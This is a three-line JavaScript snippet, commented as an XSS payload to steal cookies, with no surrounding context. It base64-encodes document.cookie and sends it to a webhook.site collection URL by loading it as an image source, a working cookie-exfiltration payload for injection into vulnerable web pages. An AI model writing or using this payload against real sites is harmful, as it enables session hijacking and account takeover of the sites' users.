// XSS Payload to steal cookies
var img = new Image();
img.src = 'https://webhook.site/f858b0d6-ea5c-43c9-9592-89c7aac6821e?data=' + btoa(document.cookie);
